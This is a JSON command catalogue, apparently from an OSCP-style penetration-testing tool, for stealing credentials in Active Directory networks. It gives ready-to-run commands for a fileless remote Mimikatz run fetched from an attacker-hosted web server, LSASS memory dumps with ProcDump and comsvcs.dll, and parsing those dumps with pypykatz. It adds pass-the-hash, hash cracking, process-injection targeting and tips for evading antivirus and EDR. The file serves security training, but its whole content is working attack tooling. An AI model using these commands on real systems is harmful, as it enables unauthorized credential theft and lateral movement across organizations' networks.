{
  "category": "post-exploit",
  "description": "Remote credential theft techniques for Active Directory environments - dump credentials from systems where you have local admin access",
  "commands": [
    {
      "id": "invoke-mimikatz-remote",
      "name": "Remote Mimikatz Credential Dump",
      "category": "post-exploit",
      "command": "Invoke-Command -ComputerName <TARGET> -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/<MIMIKATZ_SCRIPT>'); Invoke-Mimikatz -Command '\"privilege::debug\" \"sekurlsa::logonpasswords\"' }",
      "description": "Execute Mimikatz remotely via PowerShell remoting to dump credentials from LSASS memory without uploading files",
      "tags": [
        "ACTIVE_DIRECTORY",
        "CREDENTIAL_THEFT",
        "MIMIKATZ",
        "LSASS",
        "POWERSHELL_REMOTING",
        "OSCP:HIGH"
      ],
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target hostname or IP where you have local admin",
          "example": "WORKSTATION05.corp.com",
          "required": true
        },
        {
          "name": "<LHOST>",
          "description": "Your attacker IP hosting Invoke-Mimikatz.ps1",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<MIMIKATZ_SCRIPT>",
          "description": "Mimikatz PowerShell script name",
          "example": "Invoke-Mimikatz.ps1",
          "required": false
        }
      ],
      "flag_explanations": {
        "Invoke-Command": "Execute PowerShell on remote system via WinRM",
        "IEX (New-Object Net.WebClient).DownloadString()": "Download and execute PowerShell script from web server in memory (fileless)",
        "privilege::debug": "Enable SeDebugPrivilege token (required to access LSASS process)",
        "sekurlsa::logonpasswords": "Extract plaintext passwords, NTLM hashes, and Kerberos tickets from LSASS memory"
      },
      "success_indicators": [
        "Hostname:",
        "Username:",
        "Domain:",
        "NTLM hash displayed",
        "Password: (cleartext if WDigest enabled)",
        "wdigest, kerberos, tspkg sections with credentials"
      ],
      "failure_indicators": [
        "ERROR kuhl_m_sekurlsa_acquireLSA",
        "Access is denied",
        "The term 'Invoke-Mimikatz' is not recognized",
        "Unable to download script (web server unreachable)"
      ],
      "next_steps": [
        "Extract NTLM hashes from output",
        "Test hashes: crackmapexec smb <TARGET> -u <USERNAME> -H <NTLM_HASH>",
        "Pass-the-hash: evil-winrm -i <TARGET> -u <USERNAME> -H <NTLM_HASH>",
        "Crack hashes: hashcat -m 1000 hashes.txt rockyou.txt"
      ],
      "alternatives": [
        "procdump-lsass",
        "pypykatz-remote",
        "comsvcs-lsass-dump"
      ],
      "prerequisites": [
        "python3-http-server",
        "test-wsman-connectivity"
      ],
      "troubleshooting": {
        "ERROR kuhl_m_sekurlsa_acquireLSA": "SeDebugPrivilege not available OR running as non-admin. Ensure Invoke-Command runs as SYSTEM: Invoke-Command -ComputerName <TARGET> -ScriptBlock { ... } -Credential (Get-Credential)",
        "Access is denied": "Need local admin on target. Verify: Test-Path \\\\<TARGET>\\C$",
        "Invoke-Mimikatz not recognized": "Script download failed. Check web server: python3 -m http.server 80. Test from target: (New-Object Net.WebClient).DownloadString('http://<LHOST>/<SCRIPT>')",
        "AV/EDR detection": "Mimikatz heavily signatured. Use obfuscated version OR alternative: procdump.exe -ma lsass.exe lsass.dmp (then pypykatz on Kali)"
      },
      "notes": "Fileless credential dumping via PowerShell remoting.\n\nAdvantages:\n(1) No disk writes (bypasses some AV), (2) Remote execution (don't need interactive access), (3) Returns credentials to your console.\n\nPrerequisites:\n(1) Local admin on target, (2) WinRM enabled (Test-WSMan), (3) Web server hosting Invoke-Mimikatz.ps1.\n\nModern Windows (10+/2016+) has WDigest disabled by default (no plaintext passwords) - you'll get NTLM hashes only.\n\nUse pass-the-hash with these hashes.\n\nTarget logged-on users:\nDomain Admins, service accounts, other privileged accounts.\n\nOSCP:\nAfter finding admin sessions via Get-NetSession/Get-NetLoggedon, use this to dump those credentials remotely.\n\nOperational security:\nMimikatz is LOUD (triggers AV/EDR) - use only when necessary.\n\nAlternative:\nprocdump + pypykatz (stealthier).",
      "oscp_relevance": "high"
    },
    {
      "id": "procdump-lsass",
      "name": "Dump LSASS Memory with ProcDump",
      "category": "post-exploit",
      "command": "procdump.exe -accepteula -ma lsass.exe <OUTPUT_FILE>",
      "description": "Create memory dump of LSASS process using Sysinternals ProcDump - dump can be parsed offline with pypykatz or Mimikatz",
      "tags": [
        "ACTIVE_DIRECTORY",
        "CREDENTIAL_THEFT",
        "LSASS",
        "PROCDUMP",
        "SYSINTERNALS",
        "OSCP:HIGH"
      ],
      "variables": [
        {
          "name": "<OUTPUT_FILE>",
          "description": "Dump file name (recommend: lsass.dmp or lsass_<date>.dmp)",
          "example": "lsass.dmp",
          "required": true
        }
      ],
      "flag_explanations": {
        "-accepteula": "Auto-accept Sysinternals EULA (suppress GUI prompt)",
        "-ma": "Full memory dump (include all process memory, not just stack/heap)",
        "lsass.exe": "Target process name. Can also use PID: procdump.exe -accepteula -ma <PID> <OUTPUT>"
      },
      "success_indicators": [
        "Dump 1 initiated",
        "Dump 1 writing",
        "Dump 1 complete",
        "Dump file created with size >40MB (typical LSASS dump)"
      ],
      "failure_indicators": [
        "Error writing dump file",
        "Access is denied",
        "The system cannot find the file specified",
        "Process not found"
      ],
      "next_steps": [
        "Transfer dump to Kali: copy <OUTPUT_FILE> \\\\<LHOST>\\share\\ OR use SMB/HTTP download",
        "Parse with pypykatz: pypykatz lsa minidump <OUTPUT_FILE>",
        "Alternative: Parse with Mimikatz: mimikatz.exe \"sekurlsa::minidump <OUTPUT_FILE>\" \"sekurlsa::logonpasswords\" exit"
      ],
      "alternatives": [
        "invoke-mimikatz-remote",
        "comsvcs-lsass-dump",
        "task-manager-lsass-dump"
      ],
      "prerequisites": [],
      "troubleshooting": {
        "Access denied": "Need local admin OR SeDebugPrivilege. Run from elevated PowerShell OR as SYSTEM: PsExec.exe -s -i procdump.exe ...",
        "Error writing dump": "Insufficient disk space. LSASS dumps are 50-200MB. Check: wmic logicaldisk get freespace",
        "Process not found": "lsass.exe protected by PPL (Protected Process Light) on Windows 10 1607+. Workaround: Disable PPL via registry (requires reboot) OR use comsvcs.dll method",
        "AV deletion": "Some AV/EDR delete .dmp files. Use alternate extension: procdump.exe -ma lsass.exe lsass.bin"
      },
      "notes": "Stealthier alternative to Mimikatz - ProcDump is a legitimate Microsoft Sysinternals tool (less likely to trigger AV).\n\nWorkflow:\n(1) Upload procdump.exe to target (copy procdump.exe \\\\<TARGET>\\C$\\Temp\\), (2) Execute via PsExec/WMI, (3) Download dump file, (4) Parse offline on Kali.\n\nLSASS (Local Security Authority Subsystem Service) stores credentials in memory for SSO.\n\nDump contains:\nNTLM hashes, Kerberos tickets (TGT/TGS), plaintext passwords (if WDigest enabled), cached domain credentials.\n\nParsing tools:\npypykatz (Python, Kali), Mimikatz (Windows), secretsdump.py (Impacket).\n\nOSCP:\nPreferred method when Mimikatz is blocked - procdump + pypykatz is quieter.\n\nDownload ProcDump:\nhttps://live.sysinternals.com/procdump.exe",
      "oscp_relevance": "high"
    },
    {
      "id": "pypykatz-parse",
      "name": "Parse LSASS Dump with pypykatz",
      "category": "post-exploit",
      "command": "pypykatz lsa minidump <DUMP_FILE>",
      "description": "Parse LSASS memory dump offline to extract credentials (NTLM hashes, Kerberos tickets, plaintext passwords) - pure Python alternative to Mimikatz",
      "tags": [
        "ACTIVE_DIRECTORY",
        "CREDENTIAL_THEFT",
        "LSASS",
        "PYPYKATZ",
        "OSCP:HIGH"
      ],
      "variables": [
        {
          "name": "<DUMP_FILE>",
          "description": "LSASS dump file path (created by procdump, comsvcs.dll, or Task Manager)",
          "example": "lsass.dmp",
          "required": true
        }
      ],
      "flag_explanations": {
        "lsa": "Parse LSA (Local Security Authority) secrets",
        "minidump": "Parse Windows minidump format (procdump output)",
        "-o": "Output to file instead of console: pypykatz lsa minidump <DUMP_FILE> -o output.txt",
        "--json": "Output in JSON format for programmatic parsing: pypykatz lsa minidump <DUMP_FILE> --json"
      },
      "success_indicators": [
        "== LogonSession ==",
        "Username:",
        "Domain:",
        "NThash: (NTLM hash)",
        "Password: (plaintext if available)",
        "kerberos_creds section with tickets"
      ],
      "failure_indicators": [
        "Failed to parse",
        "Invalid dump file",
        "No credentials found",
        "File not found"
      ],
      "next_steps": [
        "Extract NTLM hashes: grep 'NThash:' output.txt",
        "Test hashes: crackmapexec smb <TARGET> -u <USERNAME> -H <NTLM_HASH>",
        "Pass-the-hash: evil-winrm -i <TARGET> -u <USERNAME> -H <NTLM_HASH>",
        "Crack hashes: hashcat -m 1000 hashes.txt rockyou.txt",
        "Extract Kerberos tickets: pypykatz lsa minidump <DUMP_FILE> --kerberos-dir ./tickets"
      ],
      "alternatives": [
        "mimikatz-parse-dump",
        "secretsdump-parse"
      ],
      "prerequisites": [],
      "troubleshooting": {
        "pypykatz not found": "Install: pip3 install pypykatz OR apt install pypykatz",
        "Failed to parse": "Corrupted dump OR incomplete dump. Re-dump LSASS with: procdump.exe -ma lsass.exe lsass.dmp",
        "No credentials found": "Dump successful but no cached credentials at time of dump. Target users logged out OR credentials cleared.",
        "Invalid dump file": "Wrong file type. Ensure dump is from procdump -ma, comsvcs.dll, or Task Manager (full dump, not mini)."
      },
      "notes": "Pure Python LSASS parser - runs on Linux (Kali).\n\nAdvantages over Mimikatz:\n(1) Offline parsing (no risk on target), (2) Runs on Linux (no Windows needed), (3) Supports multiple output formats (text, JSON, Kerberos ticket extraction).\n\nCredentials extracted:\n(1) NTLM hashes (always present for logged-on users), (2) Plaintext passwords (only if WDigest enabled - disabled by default on Win10+/2016+), (3) Kerberos tickets (TGT/TGS for active sessions), (4) Cached domain credentials.\n\nOSCP workflow:\n(1) Dump LSASS on target (procdump/comsvcs), (2) Transfer dump to Kali, (3) Parse with pypykatz, (4) Extract hashes, (5) Pass-the-hash or crack offline.\n\nModern Windows protection:\nCredential Guard (encrypts LSASS memory) prevents credential extraction - pypykatz will show encrypted blobs instead of cleartext.",
      "oscp_relevance": "high"
    },
    {
      "id": "comsvcs-lsass-dump",
      "name": "Dump LSASS with comsvcs.dll",
      "category": "post-exploit",
      "command": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <LSASS_PID> <OUTPUT_FILE> full",
      "description": "Create LSASS memory dump using built-in Windows comsvcs.dll - no external tools required (native LOLBin technique)",
      "tags": [
        "ACTIVE_DIRECTORY",
        "CREDENTIAL_THEFT",
        "LSASS",
        "LOLBIN",
        "COMSVCS",
        "OSCP:HIGH"
      ],
      "variables": [
        {
          "name": "<LSASS_PID>",
          "description": "LSASS process ID (get with: tasklist /fi \"imagename eq lsass.exe\" OR (Get-Process lsass).Id)",
          "example": "624",
          "required": true
        },
        {
          "name": "<OUTPUT_FILE>",
          "description": "Dump file path (recommend: C:\\Temp\\lsass.dmp)",
          "example": "C:\\Temp\\lsass.dmp",
          "required": true
        }
      ],
      "flag_explanations": {
        "rundll32.exe": "Windows utility to execute DLL functions",
        "comsvcs.dll": "COM+ Services DLL - contains MiniDump export for crash dump creation",
        "MiniDump": "Exported function in comsvcs.dll that creates process memory dumps",
        "full": "Dump type - full memory dump (includes all process memory)"
      },
      "success_indicators": [
        "Dump file created with size >40MB",
        "No error output",
        "File parseable with pypykatz or Mimikatz"
      ],
      "failure_indicators": [
        "Access is denied",
        "Invalid parameter",
        "The system cannot find the path specified",
        "File not created"
      ],
      "next_steps": [
        "Transfer dump: copy <OUTPUT_FILE> \\\\<LHOST>\\share\\",
        "Parse on Kali: pypykatz lsa minidump <OUTPUT_FILE>",
        "Extract hashes and pass-the-hash or crack"
      ],
      "alternatives": [
        "procdump-lsass",
        "invoke-mimikatz-remote",
        "task-manager-lsass-dump"
      ],
      "prerequisites": [],
      "troubleshooting": {
        "Access denied": "Need local admin OR SeDebugPrivilege. Run from elevated cmd/PowerShell.",
        "Invalid parameter": "LSASS PID incorrect. Get PID: tasklist /fi \"imagename eq lsass.exe\" (shows PID column)",
        "Path not found": "Output directory doesn't exist. Create first: mkdir C:\\Temp",
        "AV detection": "Some EDR monitors comsvcs.dll MiniDump calls. Use procdump if this fails.",
        "Protected process": "LSASS protected by PPL (Protected Process Light) on modern Windows. Disable PPL via registry (requires reboot) OR use vulnerability to bypass."
      },
      "notes": "Living-off-the-land (LOLBin) technique using native Windows DLL.\n\nAdvantages:\n(1) No external tools needed (comsvcs.dll always present), (2) Signed Microsoft binary (less suspicious), (3) Works identically to procdump.\n\nGet LSASS PID:\nPowerShell:\n(Get-Process lsass).Id OR cmd:\ntasklist /fi \"imagename eq lsass.exe\".\n\ncomsvcs.dll's MiniDump function is legitimate crash dump API - used by Windows Error Reporting.\n\nAttackers abuse it for LSASS dumping.\n\nModern detection:\nEDR monitors comsvcs.dll calls to lsass.exe PID.\n\nOSCP:\nPreferred when procdump unavailable or blocked - native Windows technique, no upload required.\n\nOne-liner with PID resolution:\nPowerShell:\nrundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\Temp\\lsass.dmp full",
      "oscp_relevance": "high"
    },
    {
      "id": "ps-get-process-owner",
      "name": "Get Process Owner (PowerShell)",
      "category": "enumeration",
      "command": "Get-WmiObject -Class Win32_Process -Filter \"name='<PROCESS_NAME>'\" | Select-Object Name, ProcessId, @{Name='Owner';Expression={$_.GetOwner().User}}",
      "description": "Identify which user account owns running processes - useful for finding service account processes to inject into",
      "tags": [
        "ACTIVE_DIRECTORY",
        "ENUMERATION",
        "PROCESSES",
        "SERVICE_ACCOUNTS",
        "OSCP:MEDIUM"
      ],
      "variables": [
        {
          "name": "<PROCESS_NAME>",
          "description": "Process name to query (e.g., sqlservr.exe, w3wp.exe)",
          "example": "sqlservr.exe",
          "required": true
        }
      ],
      "flag_explanations": {
        "Get-WmiObject -Class Win32_Process": "Query WMI for process information",
        "-Filter": "Filter processes by name",
        "GetOwner()": "WMI method to retrieve process owner (username)"
      },
      "success_indicators": [
        "Name: Process name",
        "ProcessId: PID",
        "Owner: Username running process"
      ],
      "failure_indicators": [
        "Access denied",
        "Invalid query",
        "No processes found"
      ],
      "next_steps": [
        "If owner is service account you compromised: Inject into process for privilege escalation",
        "If owner is SYSTEM/admin: Migrate to this process via Meterpreter OR steal token",
        "Check all processes: Get-WmiObject Win32_Process | Select Name, @{Name='Owner';Expression={$_.GetOwner().User}} | Sort Owner"
      ],
      "alternatives": [
        "tasklist-verbose"
      ],
      "prerequisites": [],
      "troubleshooting": {
        "Access denied": "Need local admin to query process owners. Run from elevated PowerShell.",
        "No processes found": "Process name incorrect. List all: Get-Process OR tasklist",
        "Owner field empty": "Process is SYSTEM or protected. Owner will show for user-owned processes only."
      },
      "notes": "Identify which user account runs specific processes.\n\nUse case:\nYou compromised 'sqlservice' account and want to find where it's actively running (not just sessions).\n\nIf you find sqlservr.exe (SQL Server) running as sqlservice, you can:\n(1) Inject into that process (becomes sqlservice context), (2) Access resources as sqlservice (files, registry, network).\n\nAlternative:\ntasklist /v shows owner but requires admin.\n\nThis WMI method also requires admin but provides programmatic access.\n\nOSCP:\nUse after compromising service account - find where it runs, target those processes for code execution.",
      "oscp_relevance": "medium"
    }
  ]
}